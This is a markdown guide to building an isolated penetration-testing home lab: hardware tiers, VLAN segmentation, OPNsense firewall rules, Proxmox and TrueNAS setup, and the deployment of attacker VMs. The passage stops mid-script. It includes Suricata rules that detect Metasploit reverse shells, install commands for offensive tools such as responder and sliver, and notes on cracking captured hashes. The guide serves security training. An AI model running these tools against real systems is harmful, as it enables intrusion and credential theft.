# Penetration Testing Home Lab Guide
## Professional Infrastructure for Ethical Hacking & Security Research

> **For:** Security professionals, students, researchers, and enthusiasts  
> **Last Updated:** November 2025  
> **Based on:** Industry best practices, MITRE ATT&CK, and real-world implementations  
> **Skill Level:** Beginner to Advanced (scalable approach)

---

## Table of Contents

1. [Executive Overview](#executive-overview)
2. [Hardware Options & Planning](#hardware-options--planning)
3. [Network Architecture & Topology](#network-architecture--topology)
4. [Security Segmentation Strategy](#security-segmentation-strategy)
5. [Virtualization Platform Configuration](#virtualization-platform-configuration)
6. [Attack & Target VM Deployment](#attack--target-vm-deployment)
7. [Advanced Lab Scenarios](#advanced-lab-scenarios)
8. [Tool Arsenal Integration](#tool-arsenal-integration)
9. [Automation & Infrastructure as Code](#automation--infrastructure-as-code)
10. [Monitoring & Blue Team Integration](#monitoring--blue-team-integration)
11. [Hardware Integration Strategies](#hardware-integration-strategies)
12. [Practice Scenarios & Certifications](#practice-scenarios--certifications)
13. [OPSEC & Safety Protocols](#opsec--safety-protocols)
14. [Continuous Learning Path](#continuous-learning-path)

---

## Executive Overview

### Why Build a Penetration Testing Lab?

A well-designed penetration testing lab provides a **safe, legal, and repeatable environment** for:

- 🎯 **Hands-on learning** of offensive security techniques
- 🏆 **Certification preparation** (OSCP, PNPT, GPEN, CRTP, CEH)
- 🔬 **Tool testing** before client engagements
- 🛡️ **Blue team training** with real attack scenarios
- 📊 **Research** into new vulnerabilities and exploits
- 💼 **Career advancement** in cybersecurity

### What This Guide Covers

This comprehensive guide takes you from initial hardware selection through advanced purple teaming exercises. Whether you're building on:

- **A laptop** with 16GB RAM and VirtualBox
- **A workstation** with 32GB+ RAM and VMware
- **A dedicated server** with enterprise features
- **A full rack setup** with clustering and GPU acceleration

...you'll find practical guidance tailored to your resources.

### Lab Design Philosophy

**Three-Tier Approach**:

1. **Starter Lab** (Budget: $0-500): Laptop/desktop with free virtualization
2. **Intermediate Lab** (Budget: $500-2000): Dedicated mini-server or workstation
3. **Advanced Lab** (Budget: $2000+): Enterprise server(s) with clustering, GPU, storage

**Core Principles**:
- ✅ **Isolation First**: Never risk production or external systems
- ✅ **Repeatability**: Use snapshots and Infrastructure as Code
- ✅ **Purple Team Focus**: Integrate offensive and defensive capabilities
- ✅ **Scalability**: Start simple, add complexity as you learn
- ✅ **Legality**: All activities within your owned/authorized environment

### Key Objectives

1. Create **isolated attack ranges** that can't impact production
2. Build **repeatable lab scenarios** using Infrastructure as Code
3. Integrate **blue team monitoring** alongside red team activities
4. Practice **real-world attack chains** from reconnaissance to post-exploitation
5. Prepare for **professional certifications** (OSCP, GPEN, PNPT, CRTP)
6. Develop **custom tools and scripts** in controlled environments
7. Test **hardware hacking** with dedicated edge devices (optional)

---

## Hardware Options & Planning

### Minimum vs. Recommended Specifications

#### Starter Lab (Budget-Friendly)

**Target Audience**: Students, beginners, or those with space/budget constraints

**Minimum Specifications**:
- **CPU**: Quad-core (Intel i5/i7 or AMD Ryzen 5)
- **RAM**: 16GB (8GB host + 8GB for VMs)
- **Storage**: 256GB SSD minimum
- **OS**: Windows 10/11, macOS, or Linux
- **Virtualization**: VirtualBox (free) or VMware Workstation Player (free)

**What You Can Run**:
- 1 attacker VM (Kali Linux: 2 cores, 4GB RAM)
- 1-2 target VMs (Metasploitable, DVWA: 1 core, 2GB each)
- Basic network segmentation (NAT + Host-Only)

**Example Setup Cost**: $0 (using existing laptop/desktop)

#### Intermediate Lab (Dedicated Hardware)

**Target Audience**: Serious learners, certification candidates, security professionals

**Recommended Specifications**:
- **CPU**: 6-8 cores (Intel i7/i9, AMD Ryzen 7/9)
- **RAM**: 32-64GB
- **Storage**: 512GB-1TB NVMe SSD
- **Virtualization**: VMware Workstation Pro, Proxmox VE, or ESXi
- **Optional**: Dedicated NAS for storage (Synology, TrueNAS)

**What You Can Run**:
- Multiple attacker VMs (Kali, Parrot, Windows)
- Active Directory lab (DC + 2-3 workstations)
- 5-10 Linux targets
- Blue team monitoring (Security Onion or ELK)

**Example Hardware**:
- Intel NUC Extreme (i7, 64GB): ~$1200-1500
- Custom workstation build: ~$800-1200
- Used enterprise server (Dell R620, HP DL380 G8): ~$300-600

#### Advanced Lab (Enterprise-Grade)

**Target Audience**: Advanced practitioners, red team professionals, training labs

**Recommended Specifications**:
- **CPU**: 16-32+ cores (Dual Xeon, EPYC)
- **RAM**: 128GB-512GB ECC
- **Storage**: Multiple TBs (NVMe + SAS/SATA in RAID)
- **Network**: 10GbE NICs, managed switches
- **GPU**: NVIDIA RTX 3060+ for password cracking (optional)
- **Virtualization**: Proxmox VE cluster or VMware vSphere

**What You Can Run**:
- Full enterprise network simulation (50+ VMs)
- Multiple isolated labs simultaneously
- High-availability clustering
- GPU-accelerated password cracking
- Large-scale blue team infrastructure

**Example Hardware**:
- Dell PowerEdge R630/R640: ~$2000-4000 (used)
- HP ProLiant DL380 Gen9/Gen10: ~$2000-3500 (used)
- Custom built server: ~$3000-5000

**Real-World Example**: 

*A security professional ("Pacific NorthWest Computers") built an advanced lab using:*
- **Dell R630 #1**: TrueNAS storage server (8 cores, 64GB RAM)
- **Dell R630 #2**: Proxmox compute node (16 cores, 256GB RAM)
- **OPNsense VM**: Virtual firewall with VLAN support
- **Raspberry Pi 3B**: NetAlertX monitoring
- **ZimaBoard devices**: IoT/embedded testing targets
- **ZimaBoard + RTX 3050**: Dedicated GPU cracking station

*Total investment: ~$3000-4000 (used enterprise servers + accessories)*

### Hardware Selection Decision Tree

```
START: What's your budget and goals?

├─ Budget < $500 OR Learning basics?
│  └─> STARTER LAB (Laptop + VirtualBox)
│     - Perfect for: TryHackMe, basic OSCP prep
│     - Limitations: 2-3 VMs max, no complex networks
│
├─ Budget $500-2000 OR Serious about certifications?
│  └─> INTERMEDIATE LAB (Workstation/Mini-server)
│     - Perfect for: OSCP, full AD labs, blue team learning
│     - Consider: Intel NUC, used Dell T5810, custom build
│
└─ Budget $2000+ OR Professional use/training?
   └─> ADVANCED LAB (Rack server or cluster)
      - Perfect for: Red team operations, corporate training
      - Consider: Dell R630/R640, HP DL380, Proxmox cluster
      - Optional: GPU for cracking, NAS for storage
```

### Networking Hardware

#### Basic Networking (All Tiers)

**Required**:
- 1Gbps Ethernet connectivity (built into most PCs)
- Router/switch (existing home network OK for starter)

#### Advanced Networking (Intermediate+)

**Recommended**:
- **Managed Switch**: VLAN support for network segmentation
  - TP-Link TL-SG108E (8-port, ~$40)
  - Netgear GS108Tv3 (8-port, ~$60)
  - Cisco SG350 series (used, ~$100-200)

- **Firewall/Router** (choose one):
  - **Software-based** (VM on hypervisor): OPNsense, pfSense (free)
  - **Hardware appliance**: Protectli Vault (4-port, $200-400)
  - **Used enterprise**: Cisco ASA, Fortinet FortiGate ($50-200 used)

#### Enterprise Networking (Advanced)

**Optional Additions**:
- 10GbE switch for high-speed storage (iSCSI, NFS)
- Wireless access points for WiFi hacking practice
- Network tap devices for packet capture

### Storage Options

#### Local Storage (Starter/Intermediate)

- Internal SSD/NVMe: Fast, simple
- External USB drives: Backups, offline archives
- Recommendation: 1TB NVMe for OS + VMs, 2TB HDD for backups

#### Network Storage (Advanced)

**NAS Options**:
- **DIY TrueNAS**: Build on spare hardware (free software)
- **Synology**: DS920+ or DS1621+ (~$500-800)
- **QNAP**: TS-464 or TS-673A (~$400-1000)

**Benefits**:
- Centralized ISO/template storage
- NFS/iSCSI for VM storage
- Automated snapshots and versioning
- Shared folders for attacker VMs

**Real-World Example**:

*The professional setup uses a dedicated Dell R630 running TrueNAS with:*
- NFS shares for Proxmox ISOs and templates
- Shared `/pentest-data` mount with wordlists and tools
- Automated ZFS snapshots every 4 hours
- iSCSI for high-performance VM storage

### GPU for Password Cracking (Optional)

#### When to Add GPU?

**Consider GPU if**:
- Serious about password cracking research
- Preparing for OSCP (cracking captured hashes)
- Corporate penetration testing work
- Budget allows (~$300-800 extra)

#### GPU Options

| GPU | CUDA Cores | Hash Rate (NTLM) | Price (New) | Use Case |
|-----|------------|------------------|-------------|----------|
| NVIDIA GTX 1660 Super | 1408 | ~8-10 GH/s | $200-250 used | Entry-level |
| NVIDIA RTX 3060 | 3584 | ~18-22 GH/s | $300-350 | Intermediate |
| NVIDIA RTX 3060 Ti | 4864 | ~25-30 GH/s | $400-500 | Advanced |
| NVIDIA RTX 4070 | 5888 | ~35-40 GH/s | $550-600 | Professional |

**Real-World Example**:

*The advanced lab includes a ZimaBoard with RTX 3050 dedicated to password cracking:*
- Hashcat with CUDA acceleration
- ~15-20 GH/s on NTLM hashes
- Network-accessible via SSH for job submission
- Shared NFS mount for wordlists (rockyou.txt, SecLists)

### Edge Computing & IoT Devices (Optional)

#### Use Cases

- Hardware hacking practice
- IoT vulnerability research
- Covert implant simulation
- Network tap/packet capture
- Multi-architecture testing (ARM vs x86)

#### Device Options

**Single Board Computers**:
- **Raspberry Pi 4** (2GB/4GB/8GB): $35-75
  - Use: Vulnerable target, monitoring, wireless testing
- **Orange Pi 5**: $60-100
  - More powerful than RPi, PCIe support
- **Rock Pi 4**: $40-80
  - Similar to RPi with better specs

**x86 Mini PCs**:
- **ZimaBoard/ZimaBlade**: $150-300
  - Dual NIC, x86 architecture, compact
- **Intel NUC**: $200-600
  - Powerful, expandable
- **Protectli Vault**: $200-400
  - Designed for firewall/router use

**Real-World Example**:

*The advanced lab integrates several edge devices:*
- **Raspberry Pi 3B #1**: NetAlertX network monitoring
- **Raspberry Pi 3B #2**: OpenWRT wireless testing AP
- **ZimaBoard**: Network tap + packet capture
- **ZimaBlade**: Covert implant simulation (red team drop box)
- **ZimaBoard + GPU**: Password cracking workstation

### Putting It Together: Sample Builds

#### Build #1: Starter Lab ($0-100)

```
Hardware:
- Existing laptop (16GB RAM, 256GB SSD)
- Home router/network

Software:
- VirtualBox (free)
- Kali Linux VM
- Metasploitable 2 VM
- DVWA on Ubuntu VM

Network:
- NAT for internet
- Host-Only for isolated attack range

Cost: FREE (using existing hardware)
```

#### Build #2: Intermediate Lab ($800-1200)

```
Hardware:
- Used Dell Precision T5810 workstation
  - Xeon E5-1650 v3 (6 cores)
  - 32GB RAM
  - 512GB NVMe + 2TB HDD
- TP-Link 8-port managed switch (~$50)

Software:
- VMware Workstation Pro OR Proxmox VE
- Multiple attacker VMs
- Active Directory lab (5 VMs)
- 10+ Linux targets
- Security Onion

Network:
- VLANs for segmentation
- OPNsense firewall VM

Cost: ~$800-1000 total
```

#### Build #3: Advanced Lab ($3000-4000)

```
Hardware:
- Dell R630 or HP DL380 Gen9 (used)
  - Dual Xeon E5-2680 v3 (24 cores total)
  - 256GB RAM
  - 4x 1TB SSD in RAID10
  - Dual 10GbE NICs
- Second server for TrueNAS storage (optional)
- NVIDIA RTX 3060 for cracking
- Managed 10GbE switch
- Rack enclosure

Software:
- Proxmox VE cluster
- 50+ VMs capability
- Full enterprise AD environment
- Blue team infrastructure (SIEM, IDS, EDR)
- GPU-accelerated tools

Network:
- Multi-VLAN segmentation
- OPNsense with IDS/IPS
- Isolated malware lab network

Cost: ~$3000-4000
```

### Infrastructure Assessment Checklist

Before building your lab, assess what you have:

**Compute**:
- [ ] Total RAM available: _______
- [ ] Total CPU cores: _______
- [ ] Virtualization support (VT-x/AMD-V): Yes/No
- [ ] Storage capacity: _______

**Network**:
- [ ] Managed switch for VLANs: Yes/No
- [ ] Dedicated network for lab: Yes/No
- [ ] Internet bandwidth: _______

**Optional**:
- [ ] GPU for password cracking: Model _______
- [ ] NAS/shared storage: Yes/No
- [ ] Edge devices (Pi, mini PC): Yes/No
- [ ] Wireless adapters: Yes/No

**Software Licenses**:
- [ ] Virtualization platform: _______
- [ ] Windows Server licenses: _______
- [ ] Burp Suite Pro: Yes/No
- [ ] Cobalt Strike: Yes/No

Based on your assessment, choose the appropriate tier and begin planning your build!

---

## Network Architecture & Topology

### Network Design Principles

A well-architected penetration testing lab requires **network segmentation** to:

1. **Isolate attack traffic** from production networks
2. **Simulate realistic environments** (DMZ, internal networks, management)
3. **Enable blue team monitoring** without interference
4. **Prevent accidental exposure** of vulnerable systems
5. **Support multiple concurrent scenarios** (different engagement types)

### Standard Lab Network Topology

#### Basic 3-Network Design (Starter/Intermediate)



```
                     Internet
                        |
                  [Firewall/Router]
                  (Physical or VM)
                        |
        ┌───────────────┼───────────────┐
        |               |               |
   [Management]    [Attack Net]    [Target Net]
    Network          10.20.0.0/24    10.30.0.0/24
   10.10.0.0/24         |               |
        |               |               |
   [Hypervisor]    [Kali Linux]   [Vulnerable VMs]
   [Admin Tools]   [Attacker VMs]  [DC, Web Servers]
```

**Network Descriptions**:

1. **Management Network** (10.10.0.0/24)
   - Hypervisor management interface
   - Admin access only
   - NO route to attack or target networks

2. **Attack Network** (10.20.0.0/24)
   - Attacker VMs (Kali, Parrot, Windows)
   - Can reach target network (attack path)
   - Internet access for tool updates

3. **Target Network** (10.30.0.0/24)
   - Vulnerable systems
   - NO internet access (prevents data exfil in scenarios)
   - Cannot initiate connections to attack network

#### Advanced 5-Network Design (Professional)

```
                            Internet
                               |
                        [Firewall/Router]
                        (OPNsense/pfSense)
                        |     |     |     |
        ┌───────────────┼─────┼─────┼─────┼────────────┐
        |               |     |     |     |            |
    [VLAN 10]      [VLAN 20] [VLAN 30] [VLAN 40]  [VLAN 99]
    Management     Attack    Target    Blue Team  Isolated
   10.10.10.0/24  10.20.20.0/24  10.30.30.0/24  10.40.40.0/24  10.99.99.0/24
        |              |        |         |           |
   ┌────┴────┐    ┌────┴────┐  |    ┌────┴────┐     |
   |Hypervisor|   |Kali     |  |    |Security |     |
   |Admin    |    |Parrot   |  |    |Onion    |     |
   |Access   |    |Windows  |  |    |Splunk   |     |
   |         |    |Attacker |  |    |SIEM     |     |
   └─────────┘    └─────────┘  |    └─────────┘     |
                                |                     |
                           ┌────┴────────────────────┴────┐
                           | Target Network Segments      |
                           |  ┌──────────────────────┐   |
                           |  | Windows Domain       |   |
                           |  | - DC (2019 Server)   |   |
                           |  | - Workstations       |   |
                           |  | - SQL Server         |   |
                           |  └──────────────────────┘   |
                           |  ┌──────────────────────┐   |
                           |  | Linux Infrastructure |   |
                           |  | - Web Servers (DVWA) |   |
                           |  | - Metasploitable     |   |
                           |  | - Vulnerable Apps    |   |
                           |  └──────────────────────┘   |
                           |  ┌──────────────────────┐   |
                           |  | IoT/Embedded         |   |
                           |  | - Vulnerable Devices |   |
                           |  | - Network Equipment  |   |
                           |  └──────────────────────┘   |
                           └──────────────────────────────┘
```

**Network Descriptions**:

1. **VLAN 10: Management** (10.10.10.0/24)
   - Hypervisor web interface
   - Admin workstation access
   - Completely isolated

2. **VLAN 20: Attack** (10.20.20.0/24)
   - All attacker VMs
   - Internet access for updates
   - Can route to target VLAN only

3. **VLAN 30: Target** (10.30.30.0/24)
   - All vulnerable/target systems
   - NO internet (default deny)
   - Cannot reverse connect to attackers

4. **VLAN 40: Blue Team** (10.40.40.0/24)
   - Monitoring systems (IDS, SIEM)
   - Read-only access to all VLANs
   - Protected from attack VLAN

5. **VLAN 99: Isolated** (10.99.99.0/24)
   - Malware analysis
   - Dangerous testing
   - NO connectivity anywhere

**Real-World Example**: 

*A professional security lab uses this 5-VLAN design with:*
- OPNsense VM as firewall/router on Proxmox
- Raspberry Pi running NetAlertX on Management VLAN
- Kali + Parrot + Windows attacker on Attack VLAN
- Full AD domain + Linux targets on Target VLAN
- Security Onion + Splunk on Blue Team VLAN
- Completely air-gapped network for malware testing

### VLAN Segmentation Strategy

#### Why VLANs?

**Benefits**:
- Logical separation without physical hardware
- Firewall rules between networks
- Realistic enterprise simulation
- Easy to reconfigure
- Cost-effective

**Requirements**:
- Managed switch supporting 802.1Q (VLAN tagging)
- Firewall/router with VLAN support
- OR: Software firewall (OPNsense/pfSense) with VLAN-aware bridge

#### VLAN Configuration Approaches

**Approach 1: Physical Switch + Software Firewall** (Recommended)

```
Hardware:
- Managed switch (TP-Link, Netgear, Cisco)
- Hypervisor server connects to switch
- Software firewall VM (OPNsense/pfSense)

Configuration:
1. Create VLANs on physical switch
2. Tag switch ports appropriately
3. Create VLAN-aware bridge in hypervisor
4. Assign VM network interfaces to specific VLANs
5. Configure firewall rules in OPNsense/pfSense
```

**Approach 2: Hypervisor-Only VLANs** (Simple)

```
Hardware:
- Hypervisor with multiple NICs OR single NIC

Configuration:
1. Create multiple virtual bridges (vmbr0, vmbr1, vmbr2)
2. Assign VMs to specific bridges
3. Use firewall VM to route between bridges
4. No managed switch required (but less realistic)
```

**Approach 3: Nested VLANs** (Advanced)

```
Hardware:
- Managed switch with 802.1Q support
- Multiple hypervisor nodes

Configuration:
1. Trunk port between switch and hypervisor
2. VLAN tagging at hypervisor level
3. VMs inherit VLAN tags
4. Supports clustering across physical hosts
```

### IP Addressing Schemes

#### RFC 1918 Private Networks

Use these for all lab networks:
- **10.0.0.0/8**: Large networks (preferred for labs)
- **172.16.0.0/12**: Medium networks
- **192.168.0.0/16**: Small networks (avoid if conflicts with home network)

#### Recommended Subnets

| Network | VLAN | Subnet | Hosts | Purpose |
|---------|------|--------|-------|---------|
| Management | 10 | 10.10.10.0/24 | 254 | Hypervisor, admin tools |
| Attack | 20 | 10.20.20.0/24 | 254 | Attacker VMs |
| Target | 30 | 10.30.30.0/24 | 254 | Vulnerable systems |
| Blue Team | 40 | 10.40.40.0/24 | 254 | Monitoring, SIEM |
| Isolated | 99 | 10.99.99.0/24 | 254 | Malware testing |

#### IP Assignment Strategy

**Static IPs** (Recommended for lab):
- Management: 10.10.10.5-50
- Attacker VMs: 10.20.20.10-50
- Target DCs: 10.30.30.10
- Target Servers: 10.30.30.11-30
- Target Workstations: 10.30.30.50-100
- Target Linux: 10.30.30.101-200
- Blue Team: 10.40.40.10-50

**DHCP** (Optional):
- Can use DHCP server on firewall
- Reserve static leases for important hosts
- Easier for rapid deployment

### Firewall Platform Selection

#### Software Firewalls (Recommended)

**OPNsense** (Recommended for most labs):
- ✅ Free and open source
- ✅ Modern web UI
- ✅ Built-in Suricata IDS/IPS
- ✅ Easy VLAN configuration
- ✅ Regular updates
- ✅ Active community

**pfSense**:
- ✅ Mature, stable
- ✅ Large community
- ✅ Extensive documentation
- ⚠️ Some features require Netgate hardware
- ⚠️ Commercial pressure affecting open source

**VyOS**:
- ✅ CLI-driven (like Cisco/Juniper)
- ✅ Good for learning network operations
- ⚠️ Steeper learning curve
- ⚠️ Less user-friendly web UI

#### Hardware Firewalls (Optional)

**Protectli Vault**:
- Pre-built for pfSense/OPNsense
- Multiple NIC ports
- $200-400
- Good for dedicated firewall

**Used Enterprise**:
- Cisco ASA 5505/5506
- Fortinet FortiGate
- $50-200 on eBay
- ⚠️ May need licensing for updates

### Example Implementation: Proxmox + OPNsense

**Step-by-Step Network Setup** (Generalized):

1. **Create VLAN-aware bridge in Proxmox**:

```bash
# Edit /etc/network/interfaces
auto vmbr1
iface vmbr1 inet manual
    bridge-ports eth1
    bridge-stp off
    bridge-fd 0
    bridge-vlan-aware yes
    bridge-vids 10 20 30 40 99
```

2. **Create OPNsense VM**:

```bash
# Create VM with multiple network interfaces
qm create 100 --name opnsense --memory 4096 --cores 2 \
    --net0 virtio,bridge=vmbr0  # WAN (Internet)
    --net1 virtio,bridge=vmbr1,tag=10  # LAN (Management)
    --net2 virtio,bridge=vmbr1,tag=20  # Attack VLAN
    --net3 virtio,bridge=vmbr1,tag=30  # Target VLAN
    --net4 virtio,bridge=vmbr1,tag=40  # Blue Team VLAN
```

3. **Configure VMs on specific VLANs**:

```bash
# Kali on Attack VLAN
qm set 200 --net0 virtio,bridge=vmbr1,tag=20

# Metasploitable on Target VLAN
qm set 320 --net0 virtio,bridge=vmbr1,tag=30

# Security Onion on Blue Team VLAN
qm set 410 --net0 virtio,bridge=vmbr1,tag=40
```

4. **Configure OPNsense interfaces and rules** (see Security Segmentation section)

**Real-World Example**:

*An advanced lab setup uses:*
- Proxmox hypervisor with VLAN-aware bridge (vmbr1)
- OPNsense VM with 5 NICs (WAN + 4 VLANs)
- Physical managed switch connecting multiple servers
- 802.1Q trunking between switch and Proxmox nodes
- All VMs tagged appropriately for their VLAN
- Firewall rules enforcing strict segmentation

This allows 50+ VMs across multiple physical hosts, all properly segmented and firewalled.

---

## Security Segmentation Strategy

### Firewall Rules (OPNsense Configuration)

#### Management VLAN (VLAN 10) Rules

```
Priority 1: Allow admin workstation → Management interfaces (HTTPS/SSH)
Priority 2: Deny ALL → All other VLANs
Priority 3: Allow ICMP (ping) for troubleshooting
Priority 4: Allow NTP to internet time servers
Priority 5: Log and deny everything else
```

#### Attack VLAN (VLAN 20) Rules

```
Priority 1: Allow ALL → Target VLAN 30 (this is the attack path)
Priority 2: Allow DNS, HTTP/HTTPS to internet (tool updates)
Priority 3: Allow ICMP
Priority 4: Deny → Management VLAN 10
Priority 5: Allow → Blue Team VLAN 40 (for detection testing)
Priority 6: Deny → Isolated VLAN 99
Priority 7: Log ALL traffic for analysis
```

#### Target VLAN (VLAN 30) Rules

```
Priority 1: Allow inbound from Attack VLAN 20 (controlled exploitation)
Priority 2: Allow Windows Update traffic (specific IPs only)
Priority 3: Allow DNS resolution
Priority 4: Deny ALL outbound to internet (prevent data exfiltration in labs)
Priority 5: Allow Blue Team monitoring (one-way)
Priority 6: Deny → Management VLAN 10
Priority 7: Deny → Attack VLAN 20 (no reverse connections)
Priority 8: Log ALL connection attempts
```

#### Blue Team VLAN (VLAN 40) Rules

```
Priority 1: Allow monitoring traffic from all VLANs (SPAN/mirror)
Priority 2: Allow syslog inbound from all VLANs
Priority 3: Allow admin access from Management VLAN 10
Priority 4: Deny ALL connections to other VLANs
Priority 5: Allow internet access for threat intelligence feeds
Priority 6: Log ALL activity
```

#### Isolated VLAN (VLAN 99) Rules

```
Priority 1: Deny ALL to internet
Priority 2: Deny ALL to other VLANs
Priority 3: Drop ALL packets (no logging to prevent disk fill)
Priority 4: Air-gapped configuration
```

### OPNsense IDS/IPS Configuration

**Suricata Integration**:
- Enable on WAN, VLAN 20, VLAN 30 interfaces
- Use ET Open ruleset + custom rules
- Alert on:
  - Known exploit signatures
  - Metasploit payloads
  - C2 communication patterns
  - Credential dumping tools (Mimikatz, etc.)
- Forward alerts to Blue Team VLAN (Splunk/Security Onion)

**Custom IDS Rules for Lab**:
```suricata
# Detect Nmap SYN scans
alert tcp any any -> $HOME_NET any (msg:"NMAP SYN Scan"; flags:S; threshold: type both, track by_src, count 5, seconds 10; sid:1000001;)

# Detect Metasploit reverse shell
alert tcp any any -> any any (msg:"Metasploit Reverse Shell"; content:"|6d 65 74 65 72 70 72 65 74 65 72|"; sid:1000002;)

# Detect common pentesting tools User-Agent
alert http any any -> any any (msg:"Pentesting Tool User-Agent"; content:"User-Agent|3a 20|"; content:"sqlmap|"; sid:1000003;)
```

---

## Virtualization Platform Configuration

### Proxmox VE Cluster Setup

#### Initial Configuration

**Node Setup** (if multiple R630s available):
```bash
# On first R630 (already installed)
pvecm create pnw-pentest-cluster

# On additional R630s
pvecm add <first-r630-ip>
```

**Shared Storage Configuration** (TrueNAS Integration):
```bash
# Add NFS storage from TrueNAS to Proxmox
pvesm add nfs truenas-nfs --server <truenas-ip> --export /mnt/tank/proxmox --content iso,vztmpl,backup,images
```

**High Availability** (Optional for lab):
```bash
# Create HA group for critical VMs (OPNsense, monitoring)
ha-manager add <vmid> --group <groupname> --max_restart 3
```

#### Network Configuration in Proxmox

**Bridge Configuration** (`/etc/network/interfaces`):
```
auto lo
iface lo inet loopback

# Physical interface
auto eno1
iface eno1 inet manual

# Management bridge (VLAN 10)
auto vmbr0
iface vmbr0 inet static
    address 10.10.10.5/24
    gateway 10.10.10.1
    bridge-ports eno1
    bridge-stp off
    bridge-fd 0

# VLAN-aware bridge for all lab networks
auto vmbr1
iface vmbr1 inet manual
    bridge-ports eno2
    bridge-stp off
    bridge-fd 0
    bridge-vlan-aware yes
    bridge-vids 20 30 40 99

# Additional 10GbE interface (if available)
auto eno3
iface eno3 inet manual

# 10GbE storage bridge (for TrueNAS iSCSI)
auto vmbr2
iface vmbr2 inet static
    address 10.50.50.5/24
    bridge-ports eno3
    bridge-stp off
    bridge-fd 0
```

**VLAN Tagging for VMs**:
- When creating VMs, set network device to `vmbr1` and specify VLAN tag
- Example: Kali VM → vmbr1, VLAN tag 20
- Example: Windows DC → vmbr1, VLAN tag 30

#### Resource Allocation Strategy

**Dell R630 Resource Distribution**:

Assuming **32 cores, 256GB RAM** per R630:

**R630 #1 - TrueNAS Storage**:
- 8 cores, 64GB RAM minimum
- Remaining capacity for storage operations

**R630 #2 - Proxmox Compute Node**:

**Management & Infrastructure (20% resources)**:
- OPNsense VM: 4 cores, 8GB RAM
- TrueNAS replication VM (optional): 2 cores, 4GB RAM

**Attack VMs (30% resources)**:
- Kali Linux Primary: 6 cores, 16GB RAM
- Parrot OS: 4 cores, 8GB RAM
- Windows 11 Attacker: 4 cores, 8GB RAM
- BlackArch: 2 cores, 8GB RAM

**Target VMs (35% resources)**:
- Windows DC: 4 cores, 16GB RAM
- Windows SQL Server: 4 cores, 16GB RAM
- Windows Workstations (5x): 2 cores, 4GB each = 10 cores, 20GB total
- Metasploitable 2/3: 1 core, 2GB each = 2 cores, 4GB
- DVWA Ubuntu: 2 cores, 4GB
- OWASP BWA: 2 cores, 4GB
- HackTheBox targets: 4 cores, 8GB total

**Blue Team VMs (15% resources)**:
- Security Onion: 4 cores, 16GB RAM
- Splunk: 2 cores, 8GB RAM
- ELK Stack: 2 cores, 8GB RAM

**Buffer**: Keep 10-15% free for dynamic workloads

### TrueNAS Storage Configuration

**Dataset Structure**:
```
tank/
├── proxmox/
│   ├── isos/              # OS ISOs
│   ├── templates/         # VM templates
│   ├── backups/           # Automated backups
│   └── snapshots/         # ZFS snapshots
├── pentest-data/
│   ├── tools/             # Custom tools repository
│   ├── wordlists/         # SecLists, rockyou.txt, etc.
│   ├── exploits/          # Custom exploits, PoCs
│   ├── loot/              # Captured credentials, data
│   └── reports/           # Pentest reports, screenshots
└── shares/
    ├── kali-share/        # Shared folder for attacker VMs
    └── blue-team-logs/    # Centralized log storage
```

**NFS Shares for Proxmox**:
```bash
# Share ISOs and templates
zfs set sharenfs="rw=@10.10.10.0/24,no_root_squash" tank/proxmox/isos
zfs set sharenfs="rw=@10.10.10.0/24,no_root_squash" tank/proxmox/templates

# Share pentest data (mount in attacker VMs)
zfs set sharenfs="rw=@10.20.20.0/24,no_root_squash" tank/pentest-data
```

**iSCSI Target for High-Performance VM Storage** (Optional):
```bash
# Create iSCSI extent for Proxmox VM storage
# Configure via TrueNAS web UI: Sharing → Block Shares (iSCSI)
# Add initiator: iqn.proxmox-host
# Create target, associate extent
# Mount in Proxmox as iSCSI storage
```

**Automated Snapshot Schedule**:
```bash
# ZFS auto-snapshots every 4 hours, keep for 7 days
# Configure in TrueNAS: Tasks → Periodic Snapshot Tasks
# Snapshot schedule:
#   - Hourly: Keep 24
#   - Daily: Keep 7
#   - Weekly: Keep 4
```

---

## Attack & Target VM Deployment

### Attack VMs

#### Kali Linux (Primary Attacker)

**Deployment Method**:
```bash
# Download latest Kali Proxmox image
cd /var/lib/vz/template/iso/
wget https://kali.download/base-images/kali-2024.4/kali-linux-2024.4-qemu-amd64.7z
7z x kali-linux-2024.4-qemu-amd64.7z

# Create VM from qcow2 image
qm create 200 --name kali-primary --memory 16384 --cores 6 --net0 virtio,bridge=vmbr1,tag=20
qm importdisk 200 kali-linux-2024.4-qemu-amd64.qcow2 local-lvm
qm set 200 --scsihw virtio-scsi-pci --scsi0 local-lvm:vm-200-disk-0
qm set 200 --boot order=scsi0
qm set 200 --agent enabled=1
```

**Post-Installation Configuration**:
```bash
# Update system
sudo apt update && sudo apt full-upgrade -y

# Install additional tools from your ULTIMATE-CYBERSECURITY-MASTER-GUIDE
sudo apt install -y bloodhound crackmapexec impacket-scripts \
    evil-winrm responder chisel ligolo-ng sliver-client \
    pipx nuclei subfinder httpx

# Install custom tools
git clone https://github.com/your-custom-tools /opt/custom

# Mount NFS share for wordlists and tools
sudo mkdir /mnt/pentest-data
sudo mount -t nfs truenas-ip:/mnt/tank/pentest-data /mnt/pentest-data
echo "truenas-ip:/mnt/tank/pentest-data /mnt/pentest-data nfs defaults 0 0" | sudo tee -a /etc/fstab

# Configure static IP
sudo nano /etc/network/interfaces
# Add:
# auto eth0
# iface eth0 inet static
#     address 10.20.20.10/24
#     gateway 10.20.20.1
#     dns-nameservers 8.8.8.8 1.1.1.1
```

**Snapshot Creation**:
```bash
# Create baseline snapshot for quick resets
qm snapshot 200 baseline --vmstate 1 --description "Clean Kali install, all tools"
```

#### Parrot Security OS (Alternative Attacker)

**Deployment**:
```bash
# Download Parrot ISO
cd /var/lib/vz/template/iso/
wget https://download.parrot.sh/parrot/iso/5.3/Parrot-security-5.3_amd64.iso

# Create VM
qm create 201 --name parrot-sec --memory 8192 --cores 4 \
    --net0 virtio,bridge=vmbr1,tag=20 \
    --cdrom local:iso/Parrot-security-5.3_amd64.iso \
    --scsi0 local-lvm:32 --scsihw virtio-scsi-pci

# Start and install via VNC
qm start 201
```

**Configuration**: Similar to Kali, static IP 10.20.20.11

#### Windows 11 Pro (PowerShell/AD Attack Platform)

**Deployment**:
```bash
# Create Windows 11 VM
qm create 202 --name win11-attacker --memory 8192 --cores 4 \
    --net0 virtio,bridge=vmbr1,tag=20 \
    --cdrom local:iso/Win11_23H2_English_x64.iso \
    --scsi0 local-lvm:80 --scsihw virtio-scsi-pci \
    --ostype win11

# Add VirtIO drivers ISO
qm set 202 --ide2 local:iso/virtio-win-0.1.229.iso,media=cdrom
```

**Post-Installation Tools**:
```powershell
# Install Chocolatey
Set-ExecutionPolicy Bypass -Scope Process -Force
